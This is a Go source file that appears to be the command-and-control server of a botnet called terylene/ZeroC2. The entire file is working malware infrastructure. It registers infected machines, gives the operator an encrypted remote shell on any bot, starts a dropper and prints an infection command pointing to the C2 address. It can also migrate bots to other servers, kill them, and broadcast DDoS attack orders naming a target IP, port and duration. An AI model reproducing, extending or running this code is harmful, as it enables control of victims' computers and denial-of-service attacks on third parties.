package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	config "terylene/config"
	zcrypto "terylene/crypto"
	dropper "terylene/server/components/dropper"
	"terylene/server/components/fade"
	"terylene/server/components/setup"
	"terylene/server/components/transfer"
	poly "terylene/server/theme/default"
	"time"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Botstruc struct {
	conn       string
	arch       string
	OS         string
	localip    string
	pubip      string
	connID     string
	reversekey string
}

var (
	connIDs     = make(map[string]string)
	tera        = make(map[string]Botstruc)
	aliveclient = make(map[string]time.Time)
	start       = time.Now()
	shell       = false
	pubmutex    sync.Mutex
	routmutex   sync.Mutex
)

func broadcaster(message, bot string, publisher *zmq.Socket) {
	pubmutex.Lock()
	publisher.Send(fmt.Sprintf("%s:%s", bot, message), 1)
	pubmutex.Unlock()
}

func heartroutsend(router *zmq.Socket) {
	for {
		for id := range connIDs {
			routmutex.Lock()
			router.SendMessage(id, "h")
			routmutex.Unlock()
		}
		time.Sleep(2 * time.Second)
	}
}

func heartpubsend(publisher *zmq.Socket) {
	for {
		broadcaster("h", "terylene", publisher)
		time.Sleep(2 * time.Second)
	}
}

func heartbeatcheck() {
	for {
		for id, last := range aliveclient {
			if time.Since(last) > 5*time.Second {
				delete(aliveclient, id)
				delete(tera, id)
				delete(connIDs, id)
				fmt.Printf("\n\033[1;33mheartbeat monitor: terylene %s has been pronounced dead\033[0m", id)
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func ExistsInMap(m map[string]string, targetValue string) bool {
	for _, value := range m {
		if value == targetValue {
			return true
		}
	}
	return false
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func isPublicIPv4(address string) bool {
	ip := net.ParseIP(address)
	if ip == nil || ip.To4() == nil {
		return false
	}

	return !ip.IsLoopback() && !ip.IsLinkLocalMulticast() && !ip.IsLinkLocalUnicast() && !ip.IsMulticast() && !ip.IsUnspecified() && !ip.IsPrivate()
}

func isValidport(port int) bool {
	return port >= 0 && port <= 65535
}

func routerhandle(router *zmq.Socket) {
	for {
		msg, err := router.RecvMessage(0)

		go func(msg []string) {
			if err != nil {
				return
			}
			if len(msg) == 0 || len(msg) == 1 {
				return
			}

			//registration
			if len(msg) == 7 {
				if msg[1] == "reg" {
					if ExistsInMap(connIDs, msg[6]) {
						routmutex.Lock()
						router.SendMessage(msg[0], "kys")
						routmutex.Unlock()
					} else {
						key, err := zcrypto.GenerateRandomKey(32)
						if err != nil {
							log.Fatalln("Key generation failed")
						}
						bot := Botstruc{
							conn:       msg[0],
							arch:       msg[2],
							OS:         msg[3],
							localip:    msg[4],
							pubip:      msg[5],
							connID:     msg[6],
							reversekey: string(key),
						}
						tera[msg[0]] = bot
						connIDs[msg[0]] = msg[6]
						enckey, err := zcrypto.EncryptAES256(key, []byte(config.AESkey))
						if err != nil {
							log.Fatalln(err)
						}
						routmutex.Lock()
						router.SendMessage(msg[0], "terylene", config.Broadcastport, enckey)
						routmutex.Unlock()
					}
				}
			}

			if len(msg) == 2 {
				if msg[1] == "h" {
					aliveclient[msg[0]] = time.Now()
				} else if msg[1] == "injustice" {
					routmutex.Lock()
					router.SendMessage(msg[0], "justice")
					routmutex.Unlock()
				} else if msg[1] == "isdone" {
					routmutex.Lock()
					router.SendMessage(msg[0], "isserved")
					routmutex.Unlock()
				}
			}
			if len(msg) == 3 {
				if shell == true {
					var polykey string
					for _, key := range tera {
						if msg[0] == key.conn {
							polykey = key.reversekey
						}
					}
					decoutput, err := zcrypto.DecryptChaCha20Poly1305([]byte(msg[2]), []byte(polykey))
					if err != nil {
						log.Println(err)
						return
					}
					if msg[1] == "cmdS" {
						fmt.Println(fmt.Sprintf("\033[32m%s\033[0m", strings.Trim(string(decoutput), "\n")))
					} else {
						fmt.Println(fmt.Sprintf("\x1b[31m%s\x1b[0m", strings.Trim(string(decoutput), "\n")))
					}
				}
			}
		}(msg)
	}
}

func IPC() {
	rep, err := zmq.NewSocket(zmq.REP)

	if err != nil {
		log.Fatalln(err)
	}

	rep.Bind("ipc:///tmp/ZeroCall")

	for {
		msg, err := rep.RecvMessage(0)

		if err != nil {
			log.Println(err)
			break
		}

		switch len(msg) {
		case 1:
			if msg[0] == "GetBotsOnline" {
				rep.SendMessage(fmt.Sprintf("%d", len(aliveclient)))
			} else if msg[0] == "GetBotslist" {
				var result []string
				for _, bot := range tera {
					result = append(result, bot.connID)
				}
				rep.SendMessage(result)
			} else if msg[0] == "Uptime" {
				uptime := time.Since(start)
				rep.SendMessage(fmt.Sprintf("%v", uptime))
			} else if msg[0] == "shutdown" {
				rep.SendMessage("success")
				os.Exit(125)
			} else if msg[0] == "Getpayload" {
				if config.C2ip == "0.0.0.0" {
					newC2ip := getpubIp()
					rep.SendMessage(fmt.Sprintf(config.Infcommand, newC2ip))
					continue
				}
				rep.SendMessage(fmt.Sprintf(config.Infcommand, config.C2ip))
			}
		case 2:
			if msg[0] == "GetInfo" {
				found := false
				for _, bot := range tera {
					if bot.connID == msg[1] {
						found = true
						rep.SendMessage(bot.arch, bot.localip, bot.pubip, bot.OS, bot.reversekey)
					}
				}
				if !found {
					rep.SendMessage("not found")
				}
			}
		default:
			rep.SendMessage("error")
		}
	}

	log.Println("ZeroC2 Call has shutdown")
}

func randomtransfer(target string, rport, amount int, router, publisher *zmq.Socket) {
	count := 0
	for id := range aliveclient {
		routmutex.Lock()
		router.SendMessage(id, "migrate", target, rport)
		routmutex.Unlock()
		broadcaster("migrate", connIDs[id], publisher)
		delete(aliveclient, id)
		delete(tera, id)
		delete(connIDs, id)
		if count == amount {
			break
		}
	}

}

func killprompt(prompt string, router, publisher *zmq.Socket) string {
	parts := strings.Fields(prompt)

	if len(parts) != 2 {
		return poly.Killhelp
	}

	if parts[1] == "all" {
		killall(publisher)
	} else {
		return (kill(parts[1], router))
	}

	return ""
}

func killall(publisher *zmq.Socket) {
	broadcaster("killall", "terylene", publisher)
	clearScreen()
	fmt.Println(poly.Killallsuc)
}

func kill(connId string, router *zmq.Socket) string {
	for zid, id := range connIDs {
		if id == connId {
			routmutex.Lock()
			router.SendMessage(zid, "kill")
			routmutex.Unlock()
			return fmt.Sprintf(poly.Killone, connId)
		}
	}

	return poly.NoConnId
}

func transferprompt(prompt string, router, publisher *zmq.Socket) string {
	parts := strings.Fields(prompt)

	if len(parts) != 5 {
		return poly.Transferhelp
	}

	if len(aliveclient) == 0 {
		return poly.Nobots
	}

	target := parts[1]
	port := parts[2]

	if !isPublicIPv4(target) {
		return poly.InvalidIp
	}

	rport, err := strconv.Atoi(port)

	if err != nil {
		return poly.Invalidport
	}

	if !isValidport(rport) {
		return poly.Invalidport
	}

	err = transfer.Transfercheck(target, port)

	if err != nil {
		return poly.NoMitigation
	}

	if parts[3] == "random" {
		number, err := strconv.Atoi(parts[4])

		if err != nil {
			return poly.InvalidNumber
		}

		randomtransfer(target, rport, number, router, publisher)
		return poly.MitSuccess
	}

	if parts[3] == "specific" {
		for zid, id := range connIDs {
			if id == parts[4] {
				routmutex.Lock()
				router.SendMessage(zid, "migrate", target, rport)
				routmutex.Unlock()
				broadcaster("migrate", id, publisher)
				delete(aliveclient, zid)
				delete(tera, zid)
				delete(connIDs, zid)
				return poly.MitSuccess
			} else {
				continue
			}
		}

		return poly.NoConnId
	}

	return ""
}

func getpubIp() string {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return "<your ip>"
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "<your ip>"
	}
	return string(ip)
}

func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
	clearScreen()
	var polykey string
	var conn string
	shell = true
	for _, value := range tera {
		if value.connID == connID {
			polykey = value.reversekey
			conn = value.conn
		}
	}

	if polykey == "" {
		fmt.Print(fade.Amber(poly.Shellart3))
		fmt.Printf("\nNo such terylene connID: %s\n", connID)
		return
	} else {
		fmt.Print(fade.Water(poly.Shellart))
	}
	for {
		scanner.Scan()
		err := scanner.Err()
		if err != nil {
			log.Fatalln(err)
		}
		command := scanner.Text()

		if command == "" {
			continue
		}

		if command == "clear" {
			clearScreen()
		}

		if command == "exit" || command == "background" {
			clearScreen()
			shell = false
			fmt.Print(fade.Water(poly.Shellart2))
			break
		}
		encommand, err := zcrypto.EncryptChaCha20Poly1305([]byte(command), []byte(polykey))
		if err != nil {
			log.Fatalln(err)
		}
		routmutex.Lock()
		router.SendMessage(conn, "cmd", string(encommand))
		routmutex.Unlock()
	}
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	terminalcolor, router, publisher := setup.Setup()

	defer router.Close()
	defer publisher.Close()

	go heartroutsend(router)
	go heartpubsend(publisher)
	go heartbeatcheck()

	go dropper.Dropstart()
	color.Green("[✔] successfully started zeroC2 dropper")
	go IPC()
	color.Green("[✔] successfully started zeroC2 IPC calls")

	fmt.Print("press enter to continue...")
	scanner.Scan()

	clearScreen()
	fmt.Print(poly.Welcome)
	go routerhandle(router)

	for {
		terminalcolor.Print(poly.Cmd)
		scanner.Scan()

		command := scanner.Text()
		command = strings.TrimSpace(command)
		if scanner.Err() != nil {
			fmt.Println("an error has occured", scanner.Err())
			break
		}

		if strings.Contains(command, "transfer") {
			fmt.Println(transferprompt(command, router, publisher))
			continue
		}

		if strings.Contains(command, "kill") {
			fmt.Println(killprompt(command, router, publisher))
		}

		if strings.Contains(command, "shell") {
			parts := strings.Fields(command)
			if len(parts) != 2 {
				fmt.Println(poly.Shellhelp)
				continue
			}
			reversehandler(parts[1], scanner, router)
		}

		switch command {
		case "help":
			fmt.Printf(strings.TrimLeft(poly.Help, "\n"))
		case "clear":
			clearScreen()
		case "exit":
			publisher.Close()
			color.Red("[✔] successfully shutdown broadcast")
			router.Close()
			color.Red("[✔] successfully shutdown router")
			os.Exit(1)
		case "methods":
			fmt.Printf(strings.TrimLeft(poly.Methods, "\n"))
		case "list":
			fmt.Println("Number of bots:", len(aliveclient))
			if len(aliveclient) != 0 {
				for _, bot := range tera {
					fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\nlocal ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip, bot.localip)
				}
			}
		case "payload":
			fmt.Println("terylene payload:")
			if config.C2ip == "0.0.0.0" {
				newC2ip := getpubIp()
				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
				continue
			}
			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
		default:
			if strings.Contains(command, "!") {
				containsBlocked := false
				for _, value := range config.Methods {
					if strings.Contains(command, value) {
						for _, block := range config.Blocked {
							if strings.Contains(command, block) {
								containsBlocked = true
							}
						}
						if containsBlocked {
							break
						}
						parts := strings.Fields(command)
						if len(parts) == 4 {
							if !isPublicIPv4(parts[1]) {
								continue
							}
							_, err := strconv.Atoi(parts[2])
							if err != nil {
								continue
							}
							_, err = strconv.Atoi(parts[3])
							if err != nil {
								continue
							}
							broadcaster(command, "terylene", publisher)
							clearScreen()
							fmt.Println(poly.Ddosmsg)
						} else {
							fmt.Println("format: !<method> <target> <port> <duration>")
						}
						break
					}
				}
			}
		}
	}
}
